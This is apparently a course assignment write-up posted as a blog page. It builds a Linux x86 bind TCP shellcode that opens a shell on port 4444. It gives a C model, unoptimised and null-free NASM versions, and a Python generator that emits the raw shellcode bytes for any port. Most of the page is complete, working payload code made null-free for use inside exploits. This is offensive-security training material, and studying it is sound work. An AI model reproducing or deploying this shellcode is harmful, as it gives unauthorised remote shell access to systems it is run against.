---
title:  Assignment 1
description: Create a Shell Bind TCP shellcode
order: 1
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

Before we dive into assembly, let's first write a simple program in c to model the functionality:

```c
/* bind_shell_model.c
 *  - Bind to a socket, listen for a connection, provide shell.
 */

#include <sys/socket.h>	// socket, AF_INET, SOCK_STREAM
#include <unistd.h>	// dup2
#include <netinet/in.h>	// sockaddr, htons, INADDR_ANY

int main() {
	int port = 4444;
	int sockfd, connfd;
	struct sockaddr_in sockaddr;

	// Build socket

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// Bind to socket

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.s_addr = INADDR_ANY;
	bind(sockfd, (struct sockaddr *) &sockaddr, sizeof(sockaddr));

	// Listen on socket

	listen(sockfd, 0);

	// Accept a connection

	connfd = accept(sockfd, 0, 0);

	// Route i/o through connection

	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2);

	// Execute /bin/sh

	execve("/bin/sh", 0, 0);

	return 0;
}

```

It seems we have 6 syscalls to handle:
- socket
- bind
- listen
- accept
- dup2
- execve

The process for finding the functionality of a syscall generally starts with checking its man page, but interestingly, most of the syscalls related to sockets use the same syscall, passing their *call* parameter to **socketcall**:
```c
int socketcall(int call, unsigned long *args);
```

We can then find the appropriate *call* parameter for each of our syscalls:
```bash
> grep SYS_ /usr/include/linux/net.h

#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
...
```

For our first syscall, creating a socket, we'll need to use SYS_SOCKET, **1**, which we know from our c model takes the following form:
```c
int socket(int domain, int type, int protocol);
```

Let's try to put all this down in assembly:

```nasm
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

        push 0x0                ; IPPROTO_IP
        push 0x1                ; SOCK_STREAM
        push 0x2                ; AF_INET
        mov eax, 0x66           ; socketcall, 102
        mov ebx, 0x1            ; socket, 1
        mov ecx, esp            ; args
        int 0x80                ; execute
        mov esi, eax            ; save sockfd
```

As you can see, we filled the stack with the arguments to **socket** and pointed *ecx* to them.  We then filled *eax* with the **socketcall** identifier and *ebx* with the **socket** identifier, finally calling the syscall to execute.  Note we also saved the return value in esi, for future use.

The rest of the calls follow a similar pattern, as shown in the full assembly file below:

```nasm
; bind_shell_vanilla.nasm
;  - Bind to a socket, listen for a connection, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

	push 0x0		; IPPROTO_IP
	push 0x1		; SOCK_STREAM
	push 0x2		; AF_INET
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x1		; socket, 1
	mov ecx, esp		; args
	int 0x80		; execute
	mov esi, eax		; save sockfd


	; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct in_addr sin_addr, 0}
        ; eax = 0x66 (socketcall)
        ; ebx = 0x2 (bind)
        ; ecx = esp
        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|0x00000000|
        ;           sockfd      addr      addrlen  AF_INET  port  INADDR_ANY

	push 0x0		; INADDR_ANY
	push word 0x5c11	; port, 4444
	push word 0x2		; AF_INET
	mov ecx, esp
	push 0x10		; addrlen, 16
	push ecx		; addr
	push esi		; sockfd
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x2		; bind, 2	
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x4 (listen)
        ; ecx = esp
        ; esp => |----------|0x00000000|
        ;           sockfd     backlog

	push 0x0		; backlog
	push esi		; sockfd
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x4		; listen, 4
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct$
        ; eax = 0x66 (socketcall)
        ; ebx = 0x5 (accept)
        ; ecx = esp
        ; esp => |----------|0x00000000|0x00000000|
        ;           sockfd       addr     addrlen

	push 0x0		; addrlen
	push 0x0		; addr
	push esi		; sockfd
	mov eax, 0x66		; socketcall, 102
	mov ebx, 0x5		; accept, 5
	mov ecx, esp		; args
	int 0x80		; execute
	mov edi, eax		; save connfd


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x0

	mov eax, 0x3f		; dup2, 63
	mov ebx, edi		; connfd
	mov ecx, 0x0		; stdin
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 0x1

	mov eax, 0x3f		; dup2, 63
	mov ebx, edi		; connfd
	mov ecx, 0x1		; stdout
	int 0x80


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 2

	mov eax, 0x3f		; dup2, 63
	mov ebx, edi		; connfd
	mov ecx, 0x2		; stderr
	int 0x80


        ; int execve(const char *filename, char *const argv[], char *const envp[])
        ; eax = 0xb
        ; ebx = [esp +8]
        ; ecx = esp
        ; edx = [esp +4]
        ; esp => |--[esp +8]--|0x00000000|0x2f62696e|0x2f2f7368|0x00000000|
        ;                                    /bin       //sh

	push 0x0
        push 0x68732f2f
        push 0x6e69622f
	mov ebx, esp
	push 0x0
	mov edx, esp
	push ebx
	mov ecx, esp
	mov eax, 0xb
	int 0x80
```

Compiling this and running it would succeed in producing a bind shell - however, an astute observer may have noticed that there are quite a few *nulls* in this shellcode, which could cause it to break in the context of an exploit.  It is also excessively long, incorporating little compression tactics as each syscall is modular and virtually independent.  Making a few adjustments to eliminate the nulls, our new shellcode might look something like this:

```nasm
; bind_shell.nasm
;  - Bind to a socket, listen for a connection, provide shell.

global _start

section .text
_start:
        ; int socketcall(int call, unsigned long *args)
        ; int socket(int domain, int type, int protocol)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x1 (socket)
        ; ecx = esp
        ; esp => |0x00000002|0x00000001|0x00000000|
        ;          AF_INET  SOCK_STREAM    null

	xor eax, eax
	push eax		; IPPROTO_IP
	inc eax
	push eax		; SOCK_STREAM
	mov ebx, eax		; socket, 1
	inc eax
	mov edi, eax
	push eax		; AF_INET
	mov ecx, esp		; args
	mov al, 0x66		; socketcall, 102
	int 0x80
	mov esi, eax


	; int socketcall(int call, unsigned long *args)
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct in_addr sin_addr, 0}
        ; eax = 0x66 (socketcall)
        ; ebx = 0x2 (bind)
        ; ecx = esp
        ; esp => |----------|----------|0x00000018|0x0002|0x115C|0x00000000|
        ;           sockfd      addr      addrlen  AF_INET  port  INADDR_ANY

	xor eax, eax
	push eax		; INADDR_ANY
	push word 0x5c11	; port, 4444
	push word di		; AF_INET
	mov ecx, esp
	mov al, 0x10
	push eax		; addrlen, 16
	push ecx		; addr
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov ebx, edi		; bind, 2
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int listen(int sockfd, int backlog)
        ; eax = 0x66 (socketcall)
        ; ebx = 0x4 (listen)
        ; ecx = esp
        ; esp => |----------|0x00000000|
        ;           sockfd     backlog

	xor eax, eax
	push eax		; backlog
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov bl, 0x4		; listen, 4
	mov ecx, esp		; args
	int 0x80		; execute


        ; int socketcall(int call, unsigned long *args)
        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
        ; struct sockaddr_in {short int sin_family, unsigned short int sin_port, struct$
        ; eax = 0x66 (socketcall)
        ; ebx = 0x5 (accept)
        ; ecx = esp
        ; esp => |----------|0x00000000|0x00000000|
        ;           sockfd       addr     addrlen

	xor eax, eax
	push eax		; addrlen
	push eax		; addrlen
	push esi		; sockfd
	mov al, 0x66		; socketcall, 102
	mov bl, 0x5		; accept, 5
	mov ecx, esp		; args
	int 0x80		; execute
	mov ebx, eax		; save connfd


        ; int dup2(int oldfd, int newfd)
        ; eax = 0x3f (dup2)
        ; ebx = connfd
        ; ecx = 2, 1, 0

	xor ecx, ecx
	mov cl, 0x2		; stderr
duploop:
	xor eax, eax
	mov al, 0x3f		; dup2, 63
	int 0x80		; execute
	dec ecx
	jns duploop


        ; int execve(const char *filename, char *const argv[], char *const envp[])
        ; eax = 0xb
        ; ebx = [esp +8]
        ; ecx = esp
        ; edx = [esp +4]
        ; esp => |--[esp +8]--|0x00000000|0x2f62696e|0x2f2f7368|0x00000000|
        ;                                    /bin       //sh

	xor ecx, ecx
	push ecx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push ecx
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80
```

Great! Working, null-free shellcode - and we've even shrunk the size down from 159 bytes to 108 bytes.  However, this wouldn't be very useful if we had to rewrite it any time we wanted to change the port, so let's create a *generator* which will swap out the *port* parameter automatically.

```python
#!/usr/bin/python
# generator.py
#  - Generate bind tcp shellcode

import sys

if (len(sys.argv) != 2):
	print "Usage: %s <port>" % sys.argv[0]
	print "\tNote: Port must be between 256 and 65535 to avoid nulls"
	sys.exit()

try:
	port = int(sys.argv[1])
	if (port < 256 or port > 65535):
		raise ValueError
except ValueError:
	sys.exit("[-] Please enter a valid port")

port_hex = hex(port)[2:]
len_hex = len(port_hex)
if (len_hex == 4):
	port_op = "\\x"+port_hex[0:2]+"\\x"+port_hex[2:4]
elif (len_hex == 3):
	port_op = "\\x0"+port_hex[0]+"\\x"+port_hex[1:3]
else:
	sys.exit("[-] Please enter a valid port")

if ("00" in port_op):
	sys.exit("[-] Please enter a valid port")

code = (
"\\x31\\xc0\\x50\\x40\\x50\\x89\\xc3\\x40\\x89\\xc7"
"\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31"
"\\xc0\\x50\\x66\\x68"+port_op+"\\x66\\x57\\x89\\xe1"
"\\xb0\\x10\\x50\\x51\\x56\\xb0\\x66\\x89\\xfb\\x89"
"\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x56\\xb0\\x66\\xb3"
"\\x04\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\x56"
"\\xb0\\x66\\xb3\\x05\\x89\\xe1\\xcd\\x80\\x89\\xc3"
"\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80"
"\\x49\\x79\\xf7\\x31\\xc9\\x51\\x68\\x2f\\x2f\\x73"
"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89"
"\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

len = len(code)/4
print "Shellcode Length: %d" % len
print "\"%s\"" % code
```

And there you have it - a bind tcp shellcode and its very own generator.  You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_1](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_1).


<br>
{% include preamble.md %}


[&lt;&lt; Go Back]({{ site.baseurl }})
